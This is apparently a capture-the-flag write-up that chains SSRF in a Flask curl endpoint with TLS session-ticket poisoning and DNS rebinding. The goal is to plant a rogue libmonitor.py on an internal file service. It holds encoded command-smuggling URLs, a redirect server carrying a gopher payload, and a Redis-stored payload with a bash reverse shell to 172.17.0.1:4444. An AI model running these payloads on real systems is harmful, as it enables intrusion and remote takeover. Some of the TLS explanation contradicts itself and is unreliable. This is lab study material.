# Report


For this CTF, we are presented with an application that we can run on a container.  

File tree:  

```json
.
├── docker-compose.yml
├── Dockerfile
├── fileservice.py
├── requirements.txt
├── start.sh
└── webapp.py

1 directory, 6 files
```

We can check webapp.py file.  

```python
from flask import Flask,request,jsonify
import subprocess
import re

app = Flask(import_name='')


def issafeurl(url):
    if "://" not in url:
      return False
    return url.split("://", 1)[0].lower() in ['https', 'http']


@app.route("/api/fetch", methods=['GET'])
def api_fetch():
    url = request.args.get('url', None)
    if url == None:
        return jsonify({'status': 'error', 'msg': 'url is empty'})

    if not issafeurl(url):
        return jsonify({'status': 'error', 'msg': 'unsafe url'})

    try:
        # DevTeam: TODO: We must finish this endpoint as soon as possible and store the result somewhere!
        subprocess.check_call(["curl", "-Lk", url])
    except:
        pass

    return jsonify({'status':'success'})   
```

This Python code is a basic **Flask web application** that implements an **API endpoint** to fetch a given URL using `curl`. Here’s a **step-by-step explanation** of what each part of the code does:

---

### **1. URL Safety Check Function**

```python
def issafeurl(url):
    if "://" not in url:
      return False
    return url.split("://", 1)[0].lower() in ['https', 'http']
```

- Checks if the URL:
    
    - Contains `://` (i.e., includes a scheme like `http://` or `https://`)
        
    - Begins with a safe scheme (`http` or `https`)
        

This helps **avoid dangerous schemes** like `file://`, `ftp://`, or `data:`.

---

### **2. API Route `/api/fetch`**

```python
@app.route("/api/fetch", methods=['GET'])
def api_fetch():
```

- Defines an HTTP **GET** endpoint at `/api/fetch`.
    

---

### **3. Get URL Parameter**

```python
    url = request.args.get('url', None)
    if url == None:
        return jsonify({'status': 'error', 'msg': 'url is empty'})
```

- Gets the `url` parameter from the request.
    
- If `url` is missing, returns a JSON error response.
    

---

### **6. Check URL Safety**

```python
    if not issafeurl(url):
        return jsonify({'status': 'error', 'msg': 'unsafe url'})
```

- Uses `issafeurl()` to validate the scheme.
    
- If the URL is deemed unsafe, returns an error.
    

---

### **7. Run `curl`**

```python
    try:
        # DevTeam: TODO: We must finish this endpoint as soon as possible and store the result somewhere!
        subprocess.check_call(["curl", "-Lk", url])
    except:
        pass
```

- Tries to execute a shell command: `curl -Lk <url>` using `subprocess.check_call`.
    
    - `-L`: Follow redirects.
        
    - `-k`: Ignore SSL certificate errors.
        
- The comment indicates it's **incomplete** and results are **not being stored** yet.
    
- If `curl` fails (e.g., bad URL or no response), the exception is caught and ignored silently.
    

---

### **8. Final JSON Response**

```python
    return jsonify({'status':'success'})  
```

- Returns a success status, **even if `curl` failed** (because of the silent `except` block).
    

---

### **Summary of Functionality**

This Flask app does the following:

1. Listens on `/api/fetch`.
    
2. Accepts a URL parameter (`url`).
    
3. Validates that the URL uses `http` or `https`.
    
4. Tries to fetch the URL using `curl` (but doesn't return or store the response).
    
5. Returns `{"status": "success"}` regardless of whether `curl` succeeds.
    

---

## **Potential attack vectors:**

- We can try RCE via command injection, however, subprocess is run in a safe way. Without shell=True, and no way to bypass the URL argument.  
- The valid potential attack vector is SSRF, as the server curl any URL we provide.

Lets continue analyzing and check fileservice.py.  

```python
import threading
import socket
import os


def parse_stream(data):
    cmds    = data.decode(errors='ignore').split("\r\n")
    results   = {}
    for cmd in cmds:
        print(cmd)
        results[cmd] = handle_cmds(cmd)

    try:
        # DevTeam: for some reason we need to re-import libmonitor everytime we use it otherwise it just hangs.
        import libmonitor
        return libmonitor.new_record(results)
    except:
        # DevTeam: In case we didn't find libmonitor installed.
        return -1


def handle_cmds(line):
    line = line.lower()

    if line.startswith("mkdir"):
        dirpath = line.replace("mkdir ", "")
        os.mkdir(dirpath)
        return f"created new dir => {dirpath}"

    elif line.startswith("mkfile"):
        cmd = line.replace("mkfile ", "")
        path, content = cmd.split(" ", 1)
        open(path, "w").write(content)
        return f"created new file => {path}"

    return f"unable to parse :: {line}"


def recvall(sock):
    BUFF_SIZE = 4096
    data = b''
    try:
        while True:
            part = sock.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                break
        return data

    except Exception as e:
        return data

def handle_client(client, addr):
    commands = recvall(client)
    parse_stream(commands)
    client.close()

def main():
    print("FileServer 0.1 Started!")
    sock = socket.socket(socket.AF_INET)
    sock.bind(("0.0.0.0", 8443))
    sock.listen()

    while 1:
        conn, addr = sock.accept()
        print(f"new connection from => {addr}")
        threading.Thread(target=handle_client, args=(conn, addr)).start()


if __name__ == "__main__":
    main() 
```



This Python script implements a **multithreaded TCP server** called `FileServer 0.1` that listens on port `8443` and performs **file and directory operations** based on commands it receives from connected clients.  

Lets break each component, and then get the full picture.  

---

##  High-Level Overview

- **Purpose**: Listens for client connections over TCP, receives a command stream, parses it, and executes file-related commands (`mkdir`, `mkfile`) on the server’s filesystem.
    
- **Command Format**: Strings separated by `\r\n` (e.g., `mkdir test\r\nmkfile file.txt Hello World`)
    

---

##  Code Walkthrough

---

### 1. **`parse_stream(data)`**

```python
def parse_stream(data):
    cmds = data.decode(errors='ignore').split("\r\n")
    results = {}
    for cmd in cmds:
        print(cmd)
        results[cmd] = handle_cmds(cmd)
```

- **Input**: `data` is a raw byte stream from the socket.
    
- **Decoding**: Converts bytes to a string, ignoring decode errors.
    
- **Splitting**: Commands are split by `\r\n` (carriage return + newline).
    
- **Processing**: Each command is passed to `handle_cmds()`, and the result is stored in a dictionary with the command as the key.
    

Then:

```python
    try:
        import libmonitor
        return libmonitor.new_record(results)
    except:
        return -1
```

- **Dynamic Import**: Tries to import `libmonitor` each time it's called, as a workaround for some bug (as per the comment).
    
- **Fallback**: If `libmonitor` isn't installed or fails to import, returns `-1`.
    

---

### 2. **`handle_cmds(line)`**

```python
def handle_cmds(line):
    line = line.lower()

    if line.startswith("mkdir"):
        dirpath = line.replace("mkdir ", "")
        os.mkdir(dirpath)
        return f"created new dir => {dirpath}"

    elif line.startswith("mkfile"):
        cmd = line.replace("mkfile ", "")
        path, content = cmd.split(" ", 1)
        open(path, "w").write(content)
        return f"created new file => {path}"

    return f"unable to parse :: {line}"
```

- **Command parser and executor**:
    
    - `mkdir <dir>`: Creates a directory.
        
    - `mkfile <filename> <content>`: Creates a file and writes content into it.
        
    - For anything else, it returns a message that the command wasn't understood.
        


---

### 3. **`recvall(sock)`**

```python
def recvall(sock):
    BUFF_SIZE = 4096
    data = b''
    try:
        while True:
            part = sock.recv(BUFF_SIZE)
            data += part
            if len(part) < BUFF_SIZE:
                break
        return data
    except Exception as e:
        return data
```

- **Purpose**: Reads all incoming data from a socket until no more is available.
    
- **Loop logic**: Continues reading in chunks of 4096 bytes. Breaks if received data is smaller than the buffer size (indicating the end).
    

---

### 4. **`handle_client(client, addr)`**

```python
def handle_client(client, addr):
    commands = recvall(client)
    parse_stream(commands)
    client.close()
```

- Called in a new thread for each client.
    
- Receives the command data from the client, passes it to `parse_stream`, and then closes the connection.
    

---

### 5. **`main()`**

```python
def main():
    print("FileServer 0.1 Started!")
    sock = socket.socket(socket.AF_INET)
    sock.bind(("0.0.0.0", 8443))
    sock.listen()
```

- Creates a TCP socket and binds it to all interfaces on port `8443`.
    

```python
    while 1:
        conn, addr = sock.accept()
        print(f"new connection from => {addr}")
        threading.Thread(target=handle_client, args=(conn, addr)).start()
```

- Infinite loop to accept new connections.
    
- Each connection spawns a new thread running `handle_client`.
    

---

##  Example Input

Suppose a client sends:

```
mkdir testdir\r\nmkfile testdir/hello.txt Hello World
```

### What happens:

1. `mkdir testdir` → creates a folder named `testdir`
    
2. `mkfile testdir/hello.txt Hello World` → creates `hello.txt` inside that folder with the content "Hello World"
    
3. These results may be recorded using `libmonitor.new_record(...)`
    

---

## **Attack Vector: Remote Code Execution (RCE)**

The application exposes a dangerous vector for Remote Code Execution through the use of a custom module: `libmonitor`.

### **How?**

The `libmonitor` library is imported dynamically inside the `parse_stream()` function every time it is called. This behavior introduces a critical vulnerability:

- The server executes `import libmonitor` without verifying the integrity or source of the module.
    
- It relies on the local filesystem's Python module path to resolve the import.
    

### **Exploitation Strategy**

1. **Abuse the `mkfile` command**:  
    The application allows file creation on the server via the `mkfile` command sent over the socket.
    
2. **Plant a Malicious `libmonitor.py`**:  
    An attacker can use `mkfile libmonitor.py <payload>` to create a rogue Python module in the working directory.
    
3. **Trigger the Import**:  
    Once the malicious `libmonitor.py` is in place, the next call to `parse_stream()` will import the attacker's code and execute the `new_record()` function—defined within the rogue module.
    

This effectively gives the attacker the ability to execute arbitrary Python code on the server.

---

## Limitations:  

We need to think of a way to reach the internal Fileservice, and inject our malicious command.  

---

## **Approaches:**

Multiple techniques were implemented, were all of them resulted in a failure.  

1. Sending a malicious URL to the fileservice, with encoded line carriage and our command executed.  

```json
curl 'http://localhost:4522/api/fetch?url=http://127.0.0.1:8443/foo%0amkdir%20/tmp/x%0amkfile%20/tmp/x/pwn%20owned'

{"status":"success"}
```

The URL passes the first check, however, results in an error in the subprocess call because CURL decoded it and resulted in an illegal URL.  

```
curl: (3) URL using bad/illegal format or missing URL
```

2. We can try double encoding.  

```json
└─$ curl 'http://localhost:4522/api/fetch?url=http%3A%2F%2F127.0.0.1%3A8443%2Ffoo%250amkdir%2520%2Ftmp%2Fx%250amkfile%2520%2Ftmp%2Fx%2Fpwn%2520owned'
{"status":"success"}
```

This results into reaching the fileSystem.  

```json
new connection from => ('127.0.0.1', 35248)
GET /foo%0amkdir%20/tmp/x%0amkfile%20/tmp/x/pwn%20owned HTTP/1.1
Host: 127.0.0.1:8443
User-Agent: curl/7.68.0
Accept: */*
```

However, the results where not URL decoded, resulting into a wrong format.  

3. We can try to make a proxy python server, that takes our request and forward it to the internal with a status of 302, and use another protocol, like gopher to send raw TCP data.  
```python
from http.server import BaseHTTPRequestHandler, HTTPServer

class RedirectHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(302)
        self.send_header('Location', 'gopher://127.0.0.1:8443/_MKFILE libmonitor.py import os\nos.system("id")')
        self.end_headers()

    def log_message(self, format, *args):
        return  # Suppress logging to keep output clean

def run(server_class=HTTPServer, handler_class=RedirectHandler):
    server_address = ('0.0.0.0', 8080)  # Listen on all interfaces
    httpd = server_class(server_address, handler_class)
    print("Proxy redirect server running on port 8080...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

Run the server and sends a curl request.  


```json
└─$ curl 'http://localhost:4522/api/fetch?url=http://172.17.0.1:8080'
{"status":"success"}
```

However  

```json
  0     0    0     0    0     0      0      0 --:--:--  0:00:34 --:--:--     0  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0
curl: (1) Protocol "gopher" not supported or disabled in libcurl

```

Multiple other techniques were tried but decided to cut it to that point and get to the actual working solution (so far).  

----

## **Solution:**

If we check the CURL function being called  

```json
curl -Lk $url
```

- L: Follow redirects
- k: do not check the certificate to allow insecure server connections.

We have used the redirect so far, however, we did not use the insecure argument. In a CTF, everything has a meaning xD. If the server is able to CURL for any URL even HTTPS ones that have a custom certificate, means that we will have to implement one. An attacks that comes in mind when abusing HTTPS and SSL is called TLS Poisoning.  

---------

# **TLS Poisoning:** 


##  What is TLS?

**TLS (Transport Layer Security)** is a cryptographic protocol that ensures **confidentiality**, **integrity**, and **authenticity** between two communicating parties—typically a client (e.g. browser) and a server.

###  Key phases in a modern TLS 1.2/1.3 handshake:

1. **ClientHello**:
    
    - The client initiates a connection.
        
    - Sends supported cipher suites, extensions, SNI, ALPN, and optionally a **session ticket** (if resuming).
        
2. **ServerHello**:
    
    - Server chooses cipher suite and key agreement method.
        
    - May issue a new session ticket for future session resumption.
        
3. **Key Exchange & Handshake**:
    
    - The client and server derive shared keys.
        
    - TLS session is now encrypted.
        

---

##  What is a TLS Session Ticket?

A **session ticket** is used to resume a previous session without a full handshake. It's opaque to the client — the **server creates it, encrypts it, and sends it to the client**, who stores it and sends it back in a future `ClientHello` via the `session_ticket` extension.

- In **TLS 1.2**, session tickets are a standalone extension.
    
- In **TLS 1.3**, they are issued via the `NewSessionTicket` message and reused similarly.
    

> The key: **The server cannot see the session ticket until after the handshake completes** — it is encrypted as part of the TLS payload, but the client includes it in the `ClientHello`.

---

##  TLS Poisoning via Session Ticket Injection

###  How it Works

When a **proxy or middleware** (e.g., load balancer, WAF, reverse proxy) terminates or inspects TLS, it might:

- **Parse only the ClientHello** (before TLS handshake is completed).
    
- **Ignore** or **pass through** the raw bytes of unknown extensions like `session_ticket`.
    

This creates an opportunity:

1. The attacker crafts a **malicious `ClientHello`**.
    
2. In the `session_ticket` extension, they **inject arbitrary binary payload**.
    
3. The proxy, unaware of the content, **forwards the `ClientHello` as-is** to the backend server.
    
4. On the backend, the custom or vulnerable application **parses the session ticket**, interprets or executes the injected data.
    

---

###  Why This Works

- The **session ticket is the only TLS field** in `ClientHello` that:
    
    - Accepts **arbitrary opaque binary data**.
        
    - Is **sent early (before encryption begins)**.
        
    - Is **not validated or parsed by most proxies** or middleboxes.
        
    - Is often **trusted or processed** by backend systems that implement custom TLS or internal protocols (e.g., servers expecting structured metadata in tickets).
        

---

To make it short, We can create a TLS server, let the application CURL our server, we inject the payload in the session ticket, and send it to the client. The client will have our payload in clear text in the session ticket. When he wants to authenticate to us again, he will send the session ticket, where our payload lives. 

Explaining like that will make it not really useful in our scenario. However, if combined with DNS rebinding attack, we reach our goal.  

DNS rebinding, in short, is an attack where a host is sent to the server with a very short TTL. When it is resolved for the first time, it points to an IP. However, due to its Time To Live( TTL), it will expire, leading to pointing to another IP.  

----

## **Exploitation (FINALLY):**

We operate a TLS server that issues a **malicious session ticket** containing our payload. The client connects to our server using a **crafted hostname** (e.g., `malicious.example.com`) that initially resolves to our server with a **very short DNS TTL**.

Upon the first connection:

- The client receives our malicious session ticket.
    
- After the DNS TTL expires, the crafted hostname is **re-resolved**—this time pointing to the internal `fileservice`.
    

When the client attempts to **resume the TLS session**, it sends the `ClientHello` with the **injected session ticket**, not to our server, but to the internal `fileservice`.

Since the session ticket is included in cleartext during the handshake, we have now successfully delivered **arbitrary binary data over raw TLS** to an internal target that:

- Accepts incoming TLS connections,
    
- Parses or mishandles session tickets (e.g., via `libmonitor.new_record()`),
    
- And mistakenly trusts the session ticket's content.
    

This technique allows us to **smuggle raw TCP payloads across boundaries**, bypassing proxies or firewalls, and ultimately achieve **remote code execution** on the internal `fileservice`.

---

Using this [tool](https://github.com/jmdx/TLS-poison) to run the TLS server.  

```json
└─$ target/debug/custom-tls -p 8443 --verbose --certs ../../rustls/test-ca/rsa/end.fullchain --key ../../rustls/test-ca/rsa/end.rsa http
[2025-06-02T09:25:01Z TRACE mio::poll] registering with poller
```

Now we need to know where we will put our malicious payload. If we check the source code of the tool, we will see that it takes the payload from a REDIS server that stores the payload in a variable called "payload". So we need to insert it.  

```json

```

And insert the payload.  

```json
└─$ redis-cli
127.0.0.1:6379> set payload "\r\nmkfile /usr/lib/python3.8/libmonitor.py def new_record(data):__import__('os').system(\"bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'\");return 0\r\n"
OK
127.0.0.1:6379> get payload
"\r\nmkfile /usr/lib/python3.8/libmonitor.py def new_record(data):__import__('os').system(\"bash -c 'bash -i >& /dev/tcp/172.17.0.1/4444 0>&1'\");return 0\r\n"
127.0.0.1:6379>
```

Now we need to exploit the DNS rebinding. We can use this [website](https://lock.cmpxchg8b.com/rebinder.html).

<br/> 

Now trigger the attack.  

```json
curl 'http://localhost:4522/api/fetch?url=https://ac110001.7f000001.rbndr.us:8443'
```

We can see that our TLS server is having some responses. However, there is an error.

<br/> 


If we check the source code of the application, we will see that it connects to redis at "redis" so we need to make it resolve it as localhost.  

```json
└─$ cat /etc/hosts
# This file was automatically generated by WSL. To stop automatic generation of this file, add the following entry to /etc/wsl.conf:
# [network]
# generateHosts = false
127.0.0.1       localhost
127.0.1.1       xtromera.localdomain    xtromera redis

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

We wait some time and check the fileservice connections.  

```
new connection from => ('127.0.0.1', 33562)

                                                                                                                                                                               +-3&$ LYI(mRtx?PiYUe)

```

We can see our payload in clear text. Check the reverse shell.  

```json
└─$ rlwrap nc -lnvp 4444
